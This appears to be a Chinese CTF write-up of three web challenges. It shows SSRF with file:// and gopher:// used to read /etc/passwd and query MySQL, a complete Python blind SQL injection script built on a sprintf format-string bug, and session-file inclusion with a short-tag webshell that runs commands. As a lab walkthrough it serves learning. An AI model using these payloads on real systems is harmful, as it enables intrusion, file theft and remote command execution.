[TOC]



## Web - 地鼠

这题没什么技巧，就是想让大家认识一下 Gopher 协议连接 MySQL。

1. 查看源代码有提示

   ```
   <!-- index.php?kk=1-->
   ```

2. 访问`http://111.231.101.223:10005/index.php?debug=kk`有源码提示

```php
<?php 
include_once "config.php"; 
if (isset($_POST['url'])&&!empty($_POST['url'])) 
{ 
    $url = $_POST['url']; 
    $content_url = getUrlContent($url); 
} 
else 
{ 
    $content_url = ""; 
} 
if(isset($_GET['debug'])) 
{ 
    show_source(__FILE__); 
} 
?> 
```

这里有一个 getUrlContent 函数，先盲猜是 ssrf，随便输个东西进去，返回

![1568338282571.png](https://i.loli.net/2019/09/15/oPMkxF2wnlJH5gc.png)

规定 localhost，那我们首先试一下伪协议吧，构造如下 payload 发现可读

```
url=file://localhost/etc/passwd
```

![1568338345764.png](https://i.loli.net/2019/09/15/Ixpa2BsAJo7DPcE.png)

那就直接读一下 config.php 文件，构造

```
url=file://localhost/var/www/html/config.php
```

```php
<?php
$hosts = "localhost";
$dbusername = "kkk";
$dbpasswd = "";
$dbname = "kap0k";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
{
    $dbinit = "create table if not exists wyf(secret varchar(100));";
    if(mysqli_query($conn,$dbinit)) return 1;
    else return 0;
}

function safe($url)
{
    $tmpurl = parse_url($url, PHP_URL_HOST);
    if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
    {
        var_dump($tmpurl);
        die("<h3>You are not localhost, get out!</h3>");
    }
    return $url;
}

function getUrlContent($url){
    $url = safe($url);
    $url = escapeshellarg($url);
    $pl = "curl ".$url;
    #echo $pl;
    $content = shell_exec($pl);
    return $content;
}

initdb($conn);

?>

```

可以读到数据库的账户密码等信息，采用的是 curl 协议，这里引入 [gopher 协议读取数据库](http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6) 。

Payload：

先在一个 Terminal 监听数据库

```
# 建立一个 kkk 的用户
MariaDB [(none)]> create user 'kkk'@'localhost';
Query OK, 0 rows affected (0.00 sec)
MariaDB [(none)]> grant all on *.* to 'kkk'@'localhost';
Query OK, 0 rows affected (0.00 sec)

# 在一个 Terminal 上进行监听
tcpdump -i lo port 3306 -w mysql.pacy

# 在另外一个窗口执行下面语句
mysql -h 127.0.0.1 -u kkk -e "use kap0k; select * from fl4g;"
```

用 Wireshark 打开刚刚生成的 mysql.pacy，追踪 TCP 流，只抓取到 3306 的报文，找到刚刚的 payload 以十六进制保存，再编个马就可以了。

![1568346480517.png](https://i.loli.net/2019/09/15/XQLSjgUuMhDAR65.png)

最终payload

```
url=gopher://localhost:3306/_%ad%00%00%01%85%a2%3f%00%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%6b%6b%6b%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%71%03%5f%6f%73%10%64%65%62%69%61%6e%2d%6c%69%6e%75%78%2d%67%6e%75%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%32%33%30%37%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%32%39%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%12%00%00%00%03%53%45%4c%45%43%54%20%44%41%54%41%42%41%53%45%28%29%06%00%00%00%02%6b%61%70%30%6b%13%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%66%6c%34%67%01%00%00%00%01
```

![1568346516424.png](https://i.loli.net/2019/09/15/BGqWI5xE2mkeonK.png)

## Web - escape

这是一道原题，之前做得很崩溃，所以拿来这里也顺便 e‘xin 一下大家，嘿嘿嘿 ：>

看似是个登陆框，但是你会发现你 fuzz 了半小时的关键词和各种常用符号返回都只是`noooooooo!`，然后~~关闭网页看下一题~~我们可以换一个思路，把全部可见字符都 fuzz 一遍，看看有什么东西被过滤了（不要问我为什么这样想，这都是经验）。

![1568559201452.png](https://i.loli.net/2019/09/15/Y5wcizMUnqKkSu4.png)

然后你就会发现 % 会返回一句 sprintf(): Too few arguments，百度一下是 printf 的格式化字符串漏洞：

https://blog.csdn.net/weixin_41185953/article/details/80485075

直接贴 payload

```python
import requests
import string

url = 'http://111.231.101.223:10004/index.php'
basehtml = 'you get it!'

def database_len():
    for i in range(15):
        payload = {"username":"admin%1$' and length(database())={}#".format(i), "password":"123"}
        r = requests.post(url, payload)
        if basehtml in r.text:
            print '[+] get database_len: %s'%(str(i))
            break
        else:
            print '[*] present database_len: %s'%(str(i))
#database_len()

'''
[+] get database_len: 5
'''


def database_name():
    name = ''
    for i in range(1,6):
        for ch in string.printable:
            payload = {"username":"admin%1$' and ascii(substr(database(),{},1))={}#".format(i,ord(ch)), "password":"123"}
            r = requests.post(url, payload)
            if basehtml in r.text:
                name += ch
                print '[+] present database_name: %s'%(name)
                break
#database_name()
'''
[+] present database_name: kap0k
'''

def table_len():
    i = 1
    while True:
        payload = {"username":"admin%1$' and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={}#".format(i), "password":"123"}
        r = requests.post(url, payload)
        if basehtml in r.text:
            print '[+] get tables_len: %s'%(str(i))
            break
        else:
            print '[*] present tables_len: %s'%(str(i))
            i += 1

#table_len()
'''
[+] get tables_len: 10
'''

def table_name():
    name = ''
    for i in range(1,11):
        for ch in string.printable:
            payload = {"username":"admin%1$' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))={}#".format(i,ord(ch)), "password":"123"}
            r = requests.post(url, payload)
            if basehtml in r.text:
                name += ch
                print '[+] present tables_name: %s'%(name)
                break
#table_name()
'''
[+] present tables_name: data,users
'''

def column_len():
    i = 1
    while True:
        payload = {"username":"admin%1$' and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273))={}#".format(i), "password":"123"}
        r = requests.post(url, payload)
        if basehtml in r.text:
            print '[+] get columns_len: %s'%(str(i))
            break
        else:
            print '[*] present columns_len: %s'%(str(i))
            i += 1
#column_len()
'''
[+] get columns_len: 7
'''

def column_name():
    name = ''
    for i in range(1,8):
        for ch in string.printable:
            payload = {"username":"admin%1$' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273),{},1))={}#".format(i,ord(ch)), "password":"123"}
            r = requests.post(url, payload)
            if basehtml in r.text:
                name += ch
                print '[+] present columns_name: %s'%(name)
                break
#column_name()
'''
[+] present columns_name: user,pw
'''

def flag_len():
    i = 1
    while True:
        payload = {"username":"admin%1$' and length((select pw from users limit 0,1)) ={}#".format(i), "password":"123"}
        r = requests.post(url, payload)
        if basehtml in r.text:
            print '[+] get flag_len: %s'%(str(i))
            break
        else:
            print '[*] present flag_len: %s'%(str(i))
            i += 1
#flag_len()
'''
[+] get flag_len: 32
'''

def flag():
    name = ''
    for i in range(1,33):
        '''
        for ch in string.printable:
            payload = {"username":"admin%1$' and ascii(substr((select pw from users),{},1))={}#".format(i,ord(ch)), "password":"123"}
            r = requests.post(url, payload)
            if basehtml in r.text:
                name += ch
                print '[+] present columns_name: %s'%(name)
                break
        '''
        # 一个个爆破有点慢，换个二分的
        down = 33
        up = 128
        while True:
            ch = (down+up) / 2
            payload = {"username":"admin%1$' and ascii(substr((select pw from users),{},1))>{}#".format(i,ch), "password":"123"}
            #print down,up
            r = requests.post(url, payload)
            if basehtml in r.text:
                down = ch
            else:
                up = ch
            if down == up-1:
                name += chr(up)
                print '[+] present columns_name: %s'%(name)
                break
        
flag()
'''
[+] present columns_name: kap0k{y0u_2_@_Bri1lian+_E5cap3r}
'''
```



## Web - 又长又短

### php 伪协议读取源码

分析网页结构，经典的登陆注册框，登陆完之后没有任何东西。

最明显的注入点就是 action 参数传文件`http://111.231.101.223:10006/index.php?action=xxx`，

尝试`http://111.231.101.223:10006/index.php?action=file:///etc/passwd`，

![1567750564064.png](https://i.loli.net/2019/09/15/m7xXAWKUzIYHL45.png)

那么下面我们直接伪协议读出全部源码`http://111.231.101.223:10006/index.php?action=php://filter/read=convert.base64-encode/resource=index.php`

`login.php、register.php、config.php、logout.php 同上`

### sql 注入？

```php
// register.php
$mysqli->set_charset("utf8");
        $sql = "select * from user where user=?";
        $stmt = $mysqli->prepare($sql);
        $stmt->bind_param("s", $username);
        $stmt->bind_result($res_id, $res_username, $res_password);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows();
```

```php
// login.php
$sql = "select pwd from user where user=?";
        $stmt = $mysqli->prepare($sql);
        $stmt->bind_param("s", $username);
        $stmt->bind_result($res_password);
        $stmt->execute();
        $stmt->fetch();
```

虽然这里有大量的数据库操作代码，但是这里连接数据库用的是 php 的接口，所以很少可能存在存在 SQL 注入。

### session 文件包含

看到文件包含，又看到 session，我们很容易联想到 session 文件包含。

```php
// login.php
if ($res_password == $password) {
    $_SESSION['user'] = base64_encode($username);
    header("location:index.php");
} else {
    die("Invalid user name or password");
}
```

这里他是把我们注册的用户名 base64 编码存到 session 里面，所以我们就有了一个利用思路，在用户名里面写个 webshell，再利用文件包含伪协议进行 base64 解码，就可以 getshell 了，当然还要绕过用户名的 waf 才行。

下面先来学习一下 session。 

通过阅读 [php](https://www.php.net/manual/zh/session.examples.basic.php) 文档，我们可以知道 session 的存储过程：

```
1. 会话 ID 通过 cookie 的方式发送到浏览器，并且在服务器端也是通过会话 ID 来取回会话中的数据。

2. 会话开始之后，PHP 就会将会话中的数据设置到`$_SESSION`变量中。

3.  当 PHP 停止的时候，它会自动读取`$_SESSION`中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。

4. 对于文件会话保存管理器，会将会话数据保存到配置项[session.save_path](https://www.php.net/manual/zh/session.configuration.php#ini.session.save-path) 所指定的位置。
```

但是我们读取不到 phpinfo，不能知道 session 的位置，这里我们可以对常见的 sesion 路径进行爆破。

```
# 常见的 session 路径：
1. /var/lib/php/sess_PHPSESSID
2. /var/lib/php/sessions/sess_PHPSESSID
3. /tmp/sess_PHPSESSID
4. /tmp/sessions/sess_PHPSESSID
```

所以我们先把路径弄出来吧。

### 找文件包含路径

先注册个 `++` 用户，看一下它的 cookie，记下 PHPSEESID。

![1567753290688.png](https://i.loli.net/2019/09/15/5ay4bJnvfUqtYm8.png)

用上面常见的 session 路径 fuzz 一下，最终 fuzz 出来的 session 路径 是 `/var/lib/php/sessions/sess_8cvnbevjitju9pqj932tu12tm7`

![1567753389388.png](https://i.loli.net/2019/09/15/i8WSU5uDcvAjoVf.png)

```python
# python
>>> 'Kys=='.decode("base64")
'++'
```

这里首先要解决的问题是，如何能够正确解码我们的 base64，这里考察的是一个 base64 编码过程：

```
第一步，将每三个字节作为一组，一共是24个二进制位。

第二步，将这24个二进制位分为四组，每个组有6个二进制位。

第三步，在每组前面加两个00，扩展成32个二进制位，即四个字节。

第四步，根据下表，得到扩展后的每个字节的对应符号，这就是Base64的编码值。
```

例子：

![1567755726983.png](https://i.loli.net/2019/09/15/bQ19qaRPDOrkSIe.png)

简单来说就是编码就是将 3 个字符变成 4 个字符，解码就是将 4 个字符变成 3 个字符。

所以要想成功我们在用户名注入的 base64，我们首先要确保 base64 前面的字符串能够被解码成功（乱码也没关系，成功就行），那段字符串就是`user|s:4:"`，一共 10 个字符，要想成功被解码，至少要凑到 12 个字符，而这里的数字 4 是代表是 base64 字符串的长度，是我们可控的，如果我们能够把 base64 的长度控制在 [100,999]，我们就能把前面的字符串控制在 12 个字符的长度了。

### 绕过 waf

```php
if(preg_match('/(php|script|\$|_| |GET|POST)/',$username)){
	die("try else!");
}
if(strlen(count_chars($username, 3))>15) {
	die("too many!");
}
```

接下来就是要绕过 waf 了，不能用`php|script|\$|_| |GET|POST`，使用的字符不能超过 15 个，这确实有点难顶，但是 php 有一个很容易被疏忽的点，那就是**短标签**。

`<? ?>`是短标签，`<?php ?>` 是长标签。在 php 的配置文件 php.ini 中有一个`short_open_tag` 的值，开启以后可以使用 PHP 的短标签：`<? ?>`，同时可以用 `<?=` 以代替 `<? echo` 。

如果我们可以构造出

```php
<?=`ls\t/`;

```

那我们就可以进行命令执行了，其中反引号 ` 是用来执行命令的，\t 是为了绕过空格。

注册用户名

```
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;<?=`ls\t/`;
```

登陆拿到 PHPSESSID 访问文件成功写入 websehll

![1567764251160.png](https://i.loli.net/2019/09/15/9lJ48iCeUKGxrcP.png)

![1567764287737.png](https://i.loli.net/2019/09/15/HhIn1Np6R5atmuc.png)

访问`http://111.231.101.223:10006/index.php?action=php://filter/read=convert.base64-decode/resource=/var/lib/php/sessions/sess_8cvnbevjitju9pqj932tu12tm7`

![1567764322841.png](https://i.loli.net/2019/09/15/i35avhZjoJH4GIu.png)

看到 flag 了，这里可以用通配符读 flag。

再注册一个用户

```
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;<?=`cat\t/*g`;
```

重复以上步骤拿到 flag。

![1567764486590.png](https://i.loli.net/2019/09/15/R7wCZejs38xvDW1.png)